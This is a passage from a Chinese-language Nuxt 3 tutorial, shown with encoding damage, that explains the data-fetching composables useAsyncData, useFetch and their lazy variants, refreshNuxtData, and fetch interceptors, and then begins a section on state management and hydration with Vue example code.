APIï¼Œä¸¦ç­‰å¾…è¿”å›å¾Œæ‰é–‹å§‹æ¸²æŸ“å…ƒä»¶ã€‚\nå› ç‚ºç€è¦½ http://localho:3000/count/useAsyncData æ™‚ï¼Œç¬¬ä¸€æ¬¡éƒ½æ˜¯ç”±å¾Œç«¯æ¸²æŸ“è™•ç†ï¼Œçœ‹ä¸å¤ªå‡ºå°èˆªæœ‰è¢«é˜»å¡çš„æ•ˆæœï¼Œå»ºè­°å¯ä»¥æ·»åŠ ä¸€ä¸‹è·¯ç”±é€£çµä¾†é€²è¡Œå°èˆªï¼Œå°±å¯ä»¥ç™¼ç¾å·®ç•°ã€‚\nç•¶æˆ‘å€‘å¾é¦–é ï¼Œç”±å®¢æˆ¶ç«¯å°èˆªè‡³ /count/useAsyncData é é¢æ™‚ï¼Œæœƒç™¼ç¾ç¶²å€çš„è·¯ç”±å·²ç¶“è®ŠåŒ–ï¼Œä½†æ˜¯é é¢ç´„ç­‰äº†ä¸€æœƒå…’æ‰æ¸²æŸ“å‡ºç¾ï¼Œé€™å°±æ˜¯å› ç‚ºé é¢ä¸­ä½¿ç”¨äº† useAsyncData() ä¾†ç²å–è³‡æ–™ï¼Œawait å°‡é˜»å¡æ•´å€‹é é¢å…ƒä»¶çš„è¼‰å…¥èˆ‡æ¸²æŸ“ï¼Œç›´è‡³ API è™•ç†å®Œç•¢å›å‚³å¾Œæ‰é–‹å§‹è¼‰å…¥è·¯ç”±æ¸²æŸ“å…ƒä»¶ã€‚\nuseAsyncData() å…±æœ‰å…©ç¨®å‘¼å«æ™‚ä½¿ç”¨åƒæ•¸å·®ç•°ï¼Œå¯ä»¥é¸æ“‡æ˜¯å¦å‚³å…¥ç¬¬ä¸€å€‹åƒæ•¸ keyï¼Œæ‰€å‚³å…¥åƒæ•¸çš„é¡å‹å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 function useAsyncData( handler: (nuxtApp?: NuxtApp) =\u0026gt; Promise\u0026lt;DataT\u0026gt;, options?: AsyncDataOptions\u0026lt;DataT\u0026gt; ): AsyncData\u0026lt;DataT\u0026gt; function useAsyncData( key: string, handler: (nuxtApp?: NuxtApp) =\u0026gt; Promise\u0026lt;DataT\u0026gt;, options?: AsyncDataOptions\u0026lt;DataT\u0026gt; ): Promise\u0026lt;AsyncData\u0026lt;DataT\u0026gt;\u0026gt; type AsyncDataOptions\u0026lt;DataT\u0026gt; = { server?: boolean lazy?: boolean default?: () =\u0026gt; DataT | Ref\u0026lt;DataT\u0026gt; | null transform?: (input: DataT) =\u0026gt; DataT pick?: string[] watch?: WatchSource[] initialCache?: boolean immediate?: boolean } interface RefreshOptions { _initial?: boolean } type AsyncData\u0026lt;DataT, ErrorT\u0026gt; = { data: Ref\u0026lt;DataT | null\u0026gt; pending: Ref\u0026lt;boolean\u0026gt; execute: () =\u0026gt; Promise\u0026lt;void\u0026gt; refresh: (opts?: RefreshOptions) =\u0026gt; Promise\u0026lt;void\u0026gt; error: Ref\u0026lt;ErrorT | null\u0026gt; } useAsyncData() å‚³å…¥çš„åƒæ•¸ keyï¼šå”¯ä¸€éµï¼Œå¯ä»¥ç¢ºä¿è³‡æ–™ä¸æœƒé‡è¤‡çš„ç²å–ï¼Œä¹Ÿå°±æ˜¯å¦‚æœ Key ç›¸åŒä¾¿ä¸æœƒå†ç™¼é€ç›¸åŒçš„è«‹æ±‚ï¼Œé™¤éé‡æ–°æ•´ç†é é¢ç”±å¾Œç«¯å†æ¬¡æ¸²æŸ“ç²å–ï¼Œæˆ–å‘¼å« useAsyncData å›å‚³çš„ refresh() å‡½æ•¸é‡æ–°å–å¾—è³‡æ–™ã€‚ handlerï¼šå›å‚³ç•°æ­¥è«‹æ±‚è³‡æ–™çš„è™•ç†å‡½æ•¸ï¼Œæ‰“ API æˆ–åŠ å·¥çš„ç•°æ­¥é‚è¼¯éƒ½å¯ä»¥åœ¨é€™è£¡è™•ç†ã€‚ optionsï¼š serverï¼šæ˜¯å¦åœ¨ä¼ºæœå™¨ç«¯ç²å–è³‡æ–™ï¼Œé è¨­ç‚º trueã€‚ lazyï¼šæ˜¯å¦æ–¼è¼‰å…¥è·¯ç”±å¾Œæ‰é–‹å§‹åŸ·è¡Œç•°æ­¥è«‹æ±‚å‡½æ•¸ï¼Œé è¨­ç‚º falseï¼Œæ‰€ä»¥æœƒé˜»æ­¢è·¯ç”±è¼‰å…¥ç›´åˆ°è«‹æ±‚å®Œæˆå¾Œæ‰é–‹å§‹æ¸²æŸ“é é¢å…ƒä»¶ã€‚ defaultï¼šç•¶å‚³å…¥é€™å€‹ factory functionï¼Œå¯ä»¥å°‡ç•°æ­¥è«‹æ±‚ç™¼é€èˆ‡å›å‚³è§£æå‰ï¼Œè¨­å®šè³‡æ–™çš„é è¨­å€¼ï¼Œå°æ–¼è¨­å®š lazy: true é¸é …ç‰¹åˆ¥æœ‰ç”¨è™•ï¼Œè‡³å°‘æœ‰å€‹é è¨­å€¼å¯ä»¥ä½¿ç”¨åŠæ¸²æŸ“é¡¯ç¤ºã€‚ transformï¼šä¿®æ”¹åŠ å·¥ handler å›å‚³çµæœçš„å‡½æ•¸ã€‚ pickï¼šhandler è‹¥å›å‚³ä¸€å€‹ç‰©ä»¶ï¼Œåªå¾ä¸­ä¾ç…§éœ€è¦çš„ key å–å‡ºè³‡æ–™ï¼Œä¾‹å¦‚åªå¾ JSON ç‰©ä»¶ä¸­å–çš„æŸå¹¾å€‹ key çµ„æˆæ–°çš„ç‰©ä»¶ã€‚ watchï¼šç›£è½ ref æˆ– reactive éŸ¿æ‡‰å¼è³‡æ–™ç™¼ç”Ÿè®ŠåŒ–æ™‚ï¼Œè§¸ç™¼é‡æ–°è«‹æ±‚è³‡æ–™ï¼Œé©ç”¨æ–¼è³‡æ–™åˆ†é ã€éæ¿¾çµæœæˆ–æœå°‹ç­‰æƒ…å¢ƒã€‚ initialCacheï¼šé è¨­ç‚º trueï¼Œç•¶ç¬¬ä¸€æ¬¡è«‹æ±‚è³‡æ–™æ™‚ï¼Œå°‡æœƒæŠŠæœ‰æ•ˆçš„ payload å¿«å–ï¼Œä¹‹å¾Œçš„è«‹æ±‚åªè¦æ˜¯ç›¸åŒçš„ keyï¼Œéƒ½æœƒç›´æ¥å›å‚³å¿«å–çš„çµæœã€‚ immediateï¼šé è¨­ç‚º trueï¼Œè«‹æ±‚å°‡æœƒç«‹å³è§¸ç™¼ã€‚ useAsyncData() çš„å›å‚³å€¼ dataï¼šå‚³å…¥ç•°æ­¥å‡½æ•¸çš„å›å‚³çµæœã€‚ pendingï¼šä»¥ true æˆ– false è¡¨ç¤ºæ˜¯å¦æ­£åœ¨ç²å–è³‡æ–™ã€‚ refresh / executeï¼šä¸€å€‹å‡½æ•¸ï¼Œå¯ä»¥ç”¨ä¾†é‡æ–°åŸ·è¡Œ handler å‡½æ•¸ï¼Œå›å‚³æ–°çš„è³‡æ–™ï¼Œé¡ä¼¼é‡æ–°æ•´ç†ã€é‡æ‰“ä¸€æ¬¡ API çš„æ¦‚å¿µã€‚é è¨­æƒ…æ³ä¸‹ refresh() åŸ·è¡Œå®Œä¸¦å›å‚³å¾Œæ‰èƒ½å†æ¬¡åŸ·è¡Œã€‚ errorï¼šè³‡æ–™ç²å–å¤±æ•—æ™‚å›å‚³çš„ç‰©ä»¶ã€‚ çœ‹åˆ°é€™è£¡ï¼Œæˆ‘å€‘å†é‡æ–°é–±è®€èˆ‡è§£é‡‹ useAsyncData() çš„ç¯„ä¾‹\n1 2 3 4 5 6 \u0026lt;script setup\u0026gt; const { data, pending, error, refresh } = await useAsyncData( \u0026#39;count\u0026#39;, () =\u0026gt; $fetch(\u0026#39;/api/count\u0026#39;) ) \u0026lt;/script\u0026gt; å‘¼å« useAsyncData() ä¸¦ä¸æ˜¯ç›´æ¥å¹«æˆ‘å€‘é€å‡º HTTP è«‹æ±‚ï¼Œè€Œæ˜¯åœ¨ handler å…§ä½¿ç”¨ $fetch ä¾†æ‰“ APIï¼Œåªæ˜¯ useAsyncData() çµ„åˆå¼å‡½æ•¸ï¼Œå°è£äº†æ›´å¤šæ‰“ API æ™‚å¯ä»¥ä½¿ç”¨çš„æ–¹æ³•èˆ‡åƒæ•¸ï¼Œä¾†å› æ‡‰ä¸åŒçš„ä½¿ç”¨æƒ…å¢ƒã€‚ç•¶ç„¶å¦‚æœæƒ³è¦ï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–å¥—ä»¶ä¾†æ›¿æ› $fetch ä½†å¯èƒ½å°±æ²’è¾¦æ³•äº«å—å®ƒæ‰€å¸¶ä¾†çš„å¥½è™•ã€‚\nuseFetch é€™å€‹çµ„åˆå¼å‡½æ•¸å°‡ useAsyncData å’Œ $fetch é€²è¡ŒåŒ…è£ï¼Œç•¶ä½¿ç”¨é€™å€‹å‡½æ•¸æ™‚å®ƒæœƒæ ¹æ“š URL å’Œ fetch çš„é¸é …ä¾†è‡ªå‹•ç”¢ç”Ÿ useAsyncData éœ€è¦çš„åƒæ•¸ keyï¼Œå¦‚æœå‘¼å«çš„ API æ˜¯ä¼ºæœå™¨ç«¯æ‰€æä¾›çš„ï¼Œä¹Ÿæœƒè‡ªå‹•æ ¹æ“šä¼ºæœå™¨ API è·¯ç”±ä¾†ç‚ºè«‹æ±‚æä¾›é¡å‹æç¤ºï¼Œä¸¦æ¨æ–· API çš„å›å‚³é¡å‹ã€‚\nuseFetch() æ‰€å‚³å…¥åƒæ•¸çš„é¡å‹å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 function useFetch( url: string | Request | Ref\u0026lt;string | Request\u0026gt; | () =\u0026gt; string | Request, options?: UseFetchOptions\u0026lt;DataT\u0026gt; ): Promise\u0026lt;AsyncData\u0026lt;DataT\u0026gt;\u0026gt; type UseFetchOptions = { key?: string method?: string params?: SearchParams body?: RequestInit[\u0026#39;body\u0026#39;] | Record\u0026lt;string, any\u0026gt; headers?: { key: string, value: string }[] baseURL?: string server?: boolean lazy?: boolean immediate?: boolean default?: () =\u0026gt; DataT transform?: (input: DataT) =\u0026gt; DataT pick?: string[] watch?: WatchSource[] initialCache?: boolean } type AsyncData\u0026lt;DataT\u0026gt; = { data: Ref\u0026lt;DataT\u0026gt; pending: Ref\u0026lt;boolean\u0026gt; refresh: () =\u0026gt; Promise\u0026lt;void\u0026gt; execute: () =\u0026gt; Promise\u0026lt;void\u0026gt; error: Ref\u0026lt;Error | boolean\u0026gt; } useFetch() å‚³å…¥çš„åƒæ•¸ urlï¼šè¦ç²å–è³‡æ–™çš„ URL æˆ– API Endpointã€‚ optionsï¼š(ç¹¼æ‰¿è‡ª unjs/ohmyfetch é¸é …èˆ‡ AsyncDataOptions) methodï¼šç™¼é€ HTTP è«‹æ±‚çš„æ–¹æ³•ï¼Œä¾‹å¦‚ GETã€POST æˆ– DELETE ç­‰ã€‚ paramsï¼šæŸ¥è©¢åƒæ•¸ (Query params)ã€‚ bodyï¼šè«‹æ±‚çš„ bodyï¼Œå¯ä»¥å‚³å…¥ä¸€å€‹ç‰©ä»¶ï¼Œå®ƒå°‡è‡ªå‹•è¢«è½‰åŒ–ç‚ºå­—ä¸²ã€‚ headersï¼šè«‹æ±‚çš„æ¨™é ­ (headers)ã€‚ baseURLï¼šè«‹æ±‚çš„ API è·¯å¾‘ï¼ŒåŸºæ–¼çš„ URLã€‚ optionsï¼š(ç¹¼æ‰¿è‡ª useAsyncData çš„é¸é …) keyï¼šå”¯ä¸€éµï¼Œå¯ä»¥ç¢ºä¿è³‡æ–™ä¸æœƒé‡è¤‡çš„ç²å–ï¼Œä¹Ÿå°±æ˜¯å¦‚æœ Key ç›¸åŒä¾¿ä¸æœƒå†ç™¼é€ç›¸åŒçš„è«‹æ±‚ï¼Œé™¤éé‡æ–°æ•´ç†é é¢ç”±å¾Œç«¯å†æ¬¡æ¸²æŸ“ç²å–ï¼Œæˆ–å‘¼å« useAsyncData å›å‚³çš„ refresh() å‡½æ•¸é‡æ–°å–å¾—è³‡æ–™ã€‚ serverï¼šæ˜¯å¦åœ¨ä¼ºæœå™¨ç«¯ç²å–è³‡æ–™ï¼Œé è¨­ç‚º trueã€‚ lazyï¼šæ˜¯å¦æ–¼è¼‰å…¥è·¯ç”±å¾Œæ‰é–‹å§‹åŸ·è¡Œç•°æ­¥è«‹æ±‚å‡½æ•¸ï¼Œé è¨­ç‚º falseï¼Œæ‰€ä»¥æœƒé˜»æ­¢è·¯ç”±è¼‰å…¥ç›´åˆ°è«‹æ±‚å®Œæˆå¾Œæ‰é–‹å§‹æ¸²æŸ“é é¢å…ƒä»¶ã€‚ immediateï¼šé è¨­ç‚º trueï¼Œè«‹æ±‚å°‡æœƒç«‹å³è§¸ç™¼ã€‚ defaultï¼šç•¶å‚³å…¥é€™å€‹ factory functionï¼Œå¯ä»¥å°‡ç•°æ­¥è«‹æ±‚ç™¼é€èˆ‡å›å‚³è§£æå‰ï¼Œè¨­å®šè³‡æ–™çš„é è¨­å€¼ï¼Œå°æ–¼è¨­å®š lazy: true é¸é …ç‰¹åˆ¥æœ‰ç”¨è™•ï¼Œè‡³å°‘æœ‰å€‹é è¨­å€¼å¯ä»¥ä½¿ç”¨åŠæ¸²æŸ“é¡¯ç¤ºã€‚ transformï¼šä¿®æ”¹åŠ å·¥ handler å›å‚³çµæœçš„å‡½æ•¸ã€‚ pickï¼šhandler è‹¥å›å‚³ä¸€å€‹ç‰©ä»¶ï¼Œåªå¾ä¸­ä¾ç…§éœ€è¦çš„ key å–å‡ºè³‡æ–™ï¼Œä¾‹å¦‚åªå¾ JSON ç‰©ä»¶ä¸­å–çš„æŸå¹¾å€‹ key çµ„æˆæ–°çš„ç‰©ä»¶ã€‚ watchï¼šç›£è½ ref æˆ– reactive éŸ¿æ‡‰å¼è³‡æ–™ç™¼ç”Ÿè®ŠåŒ–æ™‚ï¼Œè§¸ç™¼é‡æ–°è«‹æ±‚è³‡æ–™ï¼Œé©ç”¨æ–¼è³‡æ–™åˆ†é ã€éæ¿¾çµæœæˆ–æœå°‹ç­‰æƒ…å¢ƒã€‚ initialCacheï¼šé è¨­ç‚º trueï¼Œç•¶ç¬¬ä¸€æ¬¡è«‹æ±‚è³‡æ–™æ™‚ï¼Œå°‡æœƒæŠŠæœ‰æ•ˆçš„ payload å¿«å–ï¼Œä¹‹å¾Œçš„è«‹æ±‚åªè¦æ˜¯ç›¸åŒçš„ keyï¼Œéƒ½æœƒç›´æ¥å›å‚³å¿«å–çš„çµæœã€‚ useFetch() çš„å›å‚³å€¼ dataï¼šå‚³å…¥ç•°æ­¥å‡½æ•¸çš„å›å‚³çµæœã€‚ pendingï¼šä»¥ true æˆ– false è¡¨ç¤ºæ˜¯å¦æ­£åœ¨ç²å–è³‡æ–™ã€‚ refresh / executeï¼šä¸€å€‹å‡½æ•¸ï¼Œå¯ä»¥ç”¨ä¾†é‡æ–°åŸ·è¡Œ handler å‡½æ•¸ï¼Œå›å‚³æ–°çš„è³‡æ–™ï¼Œé¡ä¼¼é‡æ–°æ•´ç†ã€é‡æ‰“ä¸€æ¬¡ API çš„æ¦‚å¿µã€‚é è¨­æƒ…æ³ä¸‹ refresh() åŸ·è¡Œå®Œä¸¦å›å‚³å¾Œæ‰èƒ½å†æ¬¡åŸ·è¡Œã€‚ errorï¼šè³‡æ–™ç²å–å¤±æ•—æ™‚å›å‚³çš„ç‰©ä»¶ã€‚ èˆ‰å€‹ä¾‹å­ï¼Œæˆ‘å€‘æ–°å¢ä¸€å€‹ Server APIï¼Œ./server/api/about.js å…§å®¹å¦‚ä¸‹ï¼š\nserver/api/about.js 1 2 3 4 5 6 7 8 9 10 11 12 let counter = 0 export default defineEventHandler(() =\u0026gt; { counter += 1 return { name: \u0026#39;Ryan\u0026#39;, gender: \u0026#39;ç”·\u0026#39;, email: \u0026#39;ryanchien8125@gmail.com\u0026#39;, counter } }) æ–°å¢ä¸€å€‹è·¯ç”±é é¢ï¼Œ./pages/about/useFetch.vue å…§å®¹å¦‚ä¸‹ï¼š\npages/about/useFetch.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;my-24 flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;text-2xl text-gray-600\u0026#34;\u0026gt; è«‹æ±‚ç‹€æ…‹: {{ pending ? \u0026#39;è«‹æ±‚ä¸­\u0026#39; : \u0026#39;å®Œæˆ\u0026#39; }} \u0026lt;/p\u0026gt; \u0026lt;span v-if=\u0026#34;error\u0026#34; class=\u0026#34;mt-4 text-6xl text-gray-600\u0026#34;\u0026gt;æ˜¯å¦éŒ¯èª¤: {{ error }}\u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;mt-4 text-2xl text-gray-600\u0026#34;\u0026gt;å›å‚³è³‡æ–™:\u0026lt;/span\u0026gt; \u0026lt;p class=\u0026#34;mt-4 text-3xl font-semibold text-blue-500\u0026#34;\u0026gt;{{ data }}\u0026lt;/p\u0026gt; \u0026lt;button class=\u0026#34;mt-6 rounded-sm bg-blue-500 py-3 px-8 text-xl font-medium text-white hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-400 focus:ring-offset-2\u0026#34; @click=\u0026#34;refresh\u0026#34; \u0026gt; é‡æ–°ç²å–è³‡æ–™ \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const { data, pending, error, refresh } = await useFetch(\u0026#39;/api/about\u0026#39;, { pick: [\u0026#39;name\u0026#39;, \u0026#39;counter\u0026#39;] }) \u0026lt;/script\u0026gt; é€é useFetch() æˆ‘å€‘èƒ½æ›´ç°¡å–®çš„ç™¼é€ API è«‹æ±‚ï¼Œä¸¦èƒ½å¾—åˆ°ç‹€æ…‹èˆ‡é‡æ–°ç²å–è³‡æ–™çš„å‡½æ•¸ï¼Œç”šè‡³åœ¨ç¬¬ä¸€æ¬¡é€²å…¥é é¢æ™‚ï¼Œåˆ©ç”¨ $fetch å¯ä»¥ç›´æ¥å‘¼å«ä¼ºæœå™¨ API å‡½æ•¸çš„ç‰¹æ€§ä¾†é™ä½ API çš„è«‹æ±‚æ¬¡æ•¸ã€‚\næ””æˆªå™¨ æˆ‘å€‘ä¹Ÿå¯ä»¥é€é $fetch æä¾›çš„é¸é …ä¾†è¨­ç½®æ””æˆªå™¨ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 const { data, pending, error, refresh } = await useFetch(\u0026#39;/api/auth/login\u0026#39;, { onRequest({ request, options }) { // è¨­å®šè«‹æ±‚æ™‚å¤¾å¸¶çš„æ¨™é ­ options.headers = options.headers || {} options.headers.authorization = \u0026#39;...\u0026#39; }, onRequestError({ request, options, error }) { // è™•ç†è«‹æ±‚æ™‚ç™¼ç”Ÿçš„éŒ¯èª¤ }, onResponse({ request, response, options }) { // è™•ç†è«‹æ±‚å›æ‡‰çš„è³‡æ–™ return response._data }, onResponseError({ request, response, options }) { // è™•ç†è«‹æ±‚å›æ‡‰ç™¼ç”Ÿçš„éŒ¯èª¤ } }) useLazyAsyncData é è¨­çš„æƒ…æ³ä¸‹ï¼ŒuseAsyncData() çš„ options.lazy ç‚º falseï¼Œæ„æ€æ˜¯ï¼Œé è¨­å¾—æƒ…æ³ä¸‹ï¼Œç•¶é€²å…¥è·¯ç”±å¾Œï¼Œæœƒé–‹å§‹åŸ·è¡Œç•°æ­¥è«‹æ±‚å‡½æ•¸ï¼Œä¸¦æœƒæœƒé˜»æ­¢è·¯ç”±è¼‰å…¥å…ƒä»¶ç­‰ï¼Œç›´åˆ°è«‹æ±‚å®Œæˆå¾Œæ‰é–‹å§‹æ¸²æŸ“é é¢å…ƒä»¶ã€‚\nuseLazyAsyncData() å‰‡æ˜¯ options.lazy é è¨­ç‚º true çš„å°è£ï¼Œä¹Ÿå°±æ˜¯è«‹æ±‚è³‡æ–™æ™‚å®ƒå°‡ä¸æœƒé˜»å¡ï¼Œä¸¦è®“é é¢ç¹¼çºŒæ¸²æŸ“å…ƒä»¶ã€‚\nèˆ‰å€‹ä¾‹å­ï¼Œæˆ‘å€‘æ–°å¢ä¸€å€‹ Server APIï¼Œä¸¦ç¨å¾®æ·»åŠ ä¸€ä¸‹å»¶é²ï¼Œæ¨¡æ“¬ API ç´„éœ€è¦è™•ç† 2 ç§’æ‰å›å‚³è³‡æ–™ï¼Œ./server/api/count.js å…§å®¹å¦‚ä¸‹ï¼š\nserver/api/count.js 1 2 3 4 5 6 7 8 9 let counter = 0 export default defineEventHandler(async () =\u0026gt; { await new Promise((resolve) =\u0026gt; setTimeout(resolve, 2000)) // ç­‰å¾… 2 ç§’ counter += 1 return JSON.stringify(counter) }) æ–°å¢ä¸€å€‹è·¯ç”±é é¢ï¼Œ./pages/count/useLazyAsyncData.vue å…§å®¹å¦‚ä¸‹ï¼š\npages/count/useLazyAsyncData.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;my-24 flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;text-6xl text-gray-600\u0026#34;\u0026gt;ç€è¦½æ¬¡æ•¸\u0026lt;/p\u0026gt; \u0026lt;span class=\u0026#34;mt-4 text-9xl font-semibold text-sky-400\u0026#34;\u0026gt;{{ data }}\u0026lt;/span\u0026gt; \u0026lt;div class=\u0026#34;mt-8\u0026#34;\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/count\u0026#34;\u0026gt;å›é¦–é \u0026lt;/NuxtLink\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const { data } = useLazyAsyncData(\u0026#39;count\u0026#39;, () =\u0026gt; $fetch(\u0026#39;/api/count\u0026#39;)) \u0026lt;/script\u0026gt; å¯ä»¥ç™¼ç¾ï¼Œæˆ‘å€‘ä½¿ç”¨ useLazyAsyncData() å¾Œï¼Œæœƒèˆ‡å‰é¢ä½¿ç”¨ useAsyncData() çš„æ•ˆæœä¸ä¸€æ¨£ï¼Œæœƒå…ˆæ¸²æŸ“å‡ºå…ƒä»¶ï¼Œå³çœ‹åˆ°çš„æ–‡å­—ã€Œç€è¦½æ¬¡æ•¸ã€ï¼Œä¸¦å† API å›å‚³å¾Œæ‰éŸ¿æ‡‰è³‡æ–™é‡æ–°æ¸²æŸ“æ•¸å€¼ã€‚\né€é default é¸é …å¯ä»¥ä¾†å»ºç«‹ API å›å‚³å‰çš„é è¨­å€¼ï¼Œåœ¨ options.lazy ç‚º true çš„æƒ…æ³ä¸‹ï¼Œéƒ½å»ºè­°è¨­å®šä¸€ä¸‹é è¨­å€¼ï¼Œå¯ä»¥è®“ä½¿ç”¨è€…é«”é©—æ›´å¥½ä¸€äº›ã€‚\næ·»åŠ  default é¸é …ï¼Œ./pages/count/useLazyAsyncData.vue å…§å®¹å¦‚ä¸‹ï¼š\npages/count/useLazyAsyncData.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;my-24 flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;text-6xl text-gray-600\u0026#34;\u0026gt;ç€è¦½æ¬¡æ•¸\u0026lt;/p\u0026gt; \u0026lt;span class=\u0026#34;mt-4 text-9xl font-semibold text-sky-400\u0026#34;\u0026gt;{{ data }}\u0026lt;/span\u0026gt; \u0026lt;div class=\u0026#34;mt-8\u0026#34;\u0026gt; \u0026lt;NuxtLink to=\u0026#34;/\u0026#34;\u0026gt;å›é¦–é \u0026lt;/NuxtLink\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const { data } = useLazyAsyncData(\u0026#39;count\u0026#39;, () =\u0026gt; $fetch(\u0026#39;/api/count\u0026#39;), { default: () =\u0026gt; \u0026#39;-\u0026#39; }) \u0026lt;/script\u0026gt; åœ¨ API è«‹æ±‚å›ä¾†å‰ï¼Œé è¨­å€¼æœƒæ˜¯ -ã€‚\nuseLazyFetch å¦‚åŒ useLazyAsyncData æ‰€æè¿°ï¼ŒuseLazyFetch å‰‡æ˜¯ useFetch çš„ options.lazy é¸é …é è¨­ç‚º true çš„å°è£ã€‚\né‡æ–°ç²å–è³‡æ–™ å‰é¢æœ‰æåˆ°æˆ‘å€‘å¯ä»¥ä½¿ç”¨ refresh() ä¾†é‡æ–°ç²å–å…·æœ‰ä¸åŒæŸ¥è©¢åƒæ•¸çš„è³‡æ–™ã€‚\nrefreshNuxtData ä½ ä¹Ÿå¯ä»¥é€é refreshNuxtData ä¾†ä½¿ useAsyncDataã€useLazyAsyncDataã€useFetch èˆ‡ useLazyFetch çš„å¿«å–å¤±æ•ˆï¼Œå†è§¸ç™¼åˆ·æ–°è³‡æ–™ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; {{ pending ? \u0026#39;Loading\u0026#39; : count }} \u0026lt;/div\u0026gt; \u0026lt;button @click=\u0026#34;refresh\u0026#34;\u0026gt;Refresh\u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const { pending, data: count } = useLazyAsyncData(\u0026#39;count\u0026#39;, () =\u0026gt; $fetch(\u0026#39;/api/count\u0026#39;)) const refresh = () =\u0026gt; refreshNuxtData(\u0026#39;count\u0026#39;) \u0026lt;/script\u0026gt; Nuxt å·²ç¶“ç‚ºæˆ‘å€‘å°è£å¥½å¯ä»¥æ‰“ API çš„çµ„åˆå‡½æ•¸ï¼Œç”¨èµ·ä¾†ä¹Ÿç›¸ç•¶ç°¡å–®æ–¹ä¾¿ï¼Œç…§è‘—å®˜ç¶²ç¯„ä¾‹åŠ ohmyfetch å¥—ä»¶çš„èªªæ˜ï¼Œç›¸ä¿¡å¾ˆå¿«å°±èƒ½ä¸Šæ‰‹ã€‚\nç‹€æ…‹ç®¡ç† (State Management) Vue 3 çˆ¶å­å…ƒä»¶é–“è³‡æ–™å‚³éèˆ‡è®€å¯«æˆ–æ˜¯è·¨å…ƒä»¶é–“çš„ç‹€æ…‹å…±äº«ï¼Œå¯ä»¥é¸æ“‡ä½¿ç”¨ Props / Emitã€Provide / Inject æˆ– Vuex store ä¾†è™•ç†ï¼Œé€™ä¸‰ç¨®è³‡æ–™æµéƒ½ä¸å¤§ä¸€æ¨£ï¼Œæˆ‘å€‘ä¹Ÿæœƒä¾æ“šæƒ…å¢ƒä¾†æ±ºå®šç‹€æ…‹ç®¡ç†çš„æ–¹å¼ã€‚é€™é‚Šæœƒé‡å° Nuxt 3 æ‰€æä¾›çš„çµ„åˆå¼å‡½æ•¸ useState ä¾†è¬›è¿°å…ƒä»¶é–“çš„å…±äº«ç‹€æ…‹ï¼Œæ‡‰è©²å¦‚ä½•åšå®šç¾©ï¼Œä»¥åŠä½¿ç”¨ Pinia æ›¿ä»£ Vuex ä¾†åšç‹€æ…‹ç®¡ç†ã€‚\nHydration é¦–å…ˆï¼Œæˆ‘å€‘å…ˆä¾†çœ‹ä¸€å€‹ä¾‹å­ï¼Œå»ºç«‹ ./pages/random.vue å…§å®¹å¦‚ä¸‹ï¼š\npages/random.vue 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;bg-white py-24\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;text-9xl font-semibold text-sky-400\u0026#34;\u0026gt;{{ count }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const count = ref(Math.round(Math.random() * 1000)) \u0026lt;/script\u0026gt; é é¢å‘ˆç¾å‡ºï¼Œæ¯æ¬¡é‡æ–°æ•´ç†é é¢ï¼Œé é¢æœƒé¡¯ç¤ºæ–°çš„äº‚æ•¸ï¼š\nç´°å¿ƒä½ çš„å¯èƒ½æœƒç™¼ç¾ï¼Œæ¯æ¬¡é‡æ•´é é¢ï¼Œæ•¸å­—å¥½åƒè®ŠåŒ–äº†å…©æ¬¡ï¼Œåœ–ä¸­æ•¸å­—åœç•™åœ¨ 517ï¼Œé‡æ–°æ•´ç†ç¶²é å¾Œç«Ÿç„¶å…ˆè®Šæˆäº† 163 å¾Œå†è®Šæˆ 101ã€‚\né€™å€‹ç¾è±¡å…¶å¯¦æ˜¯ä¼ºæœå™¨ç«¯æ¸²æŸ“å¾Œèˆ‡å®¢æˆ¶ç«¯å†æ¬¡æ¸²æŸ“æ‰€å°è‡´çš„ã€‚è¬›çš„ç™½è©±ä¸€é»å°±æ˜¯ï¼Œå› ç‚º Nuxt é è¨­çš„æ¸²æŸ“æ¨¡å¼ Universal Rendering åœ¨ SSR æ™‚æœŸï¼Œå°‡ random.vue å…§å®¹æ–¼ä¼ºæœå™¨ç«¯æ¸²æŸ“å®Œæˆå¾Œäº‚å‡ºç”¢ç”Ÿå‡º 163 ä½œç‚ºåˆå§‹å€¼ï¼Œæ„å³ const count = ref(163)ï¼Œæ‰€ä»¥ç¶²é å…ˆé¡¯ç¤ºäº† 163 